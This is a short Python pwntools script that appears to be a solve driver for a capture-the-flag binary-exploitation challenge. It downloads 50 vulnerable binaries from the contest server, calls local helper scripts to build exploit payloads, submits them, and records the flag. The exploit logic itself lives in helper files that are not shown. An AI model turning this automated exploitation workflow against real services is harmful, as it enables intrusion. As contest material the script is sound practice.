from pwn import *
import subprocess
import json
context.log_level = "DEBUG"
BIN_PATH = "code.bin"


def get_binary(io):
    io.recvuntil(b"----------------")
    b64_binary = io.recvuntil(b"----------------", drop=True)
    with open(BIN_PATH, "wb") as f:
        f.write(base64.b64decode(b64_binary))


def main():
    io = remote("lazy-gambler-pwner.chal.idek.team", 1337)
    for i in range(50):
        get_binary(io)

        # You now have "./code.bin" which is the vulnerable, good luck!
        #
        # Some tips:
        # - The way I check if the exploit was successful requires for the binary to *NOT*
        #   crash due to segfault & co.
        #
        # - My solve takes around 5 to 10 seconds per binaries on your average computer.
        #   If yours takes much longer, you may not be on the right path...
        #
        # - The vulnerable functions and the win functions changes a bit as to not make it
        #   *too* easy to discover, but they are still fairly straightforward. My solve
        #   has 10 to 20 lines for each. Don't overengineer!
        #
        # - There are some edge cases you may not have expected (I didn't either, but they
        #   were fun enough to be kept lol), so do take time to debug and figure out
        #   everything properly if your solve fail!
        #
        # - If you are confident the issue is on remote and not your script... Triple check!
        #   If it still persist, open a ticket and I'll do my best to figure out if it is
        #   on my side or not, and fix if needed.
        #

        #b64_payload = base64.b64encode(input('> ').encode())
        #b64_payload = input('> ').encode()
        subprocess.run(['python', 'find_win.py'], check=True)
        with open('target', 'r') as f:
            print("Found targets:", f.read())
        subprocess.run(['python', 'solve.py'], check=True)
        subprocess.run(['python', 'fix_gets_solve.py'], check=True)
        with open('solution_fixed', 'rb') as f:
            data = json.load(f)
        b64_payload = data['solution_b64']
        print("Found solution:", base64.b64decode(b64_payload))
        # if solution makes us end up at gets/fgets, if so augment it
        io.sendlineafter(b"solution:\n", b64_payload)
        log.success(f"Challenge {i+1} solved!")

    io.interactive()


main()
# idek{automation_is_fun_but_it_could_be_funnier_by_being_harder}
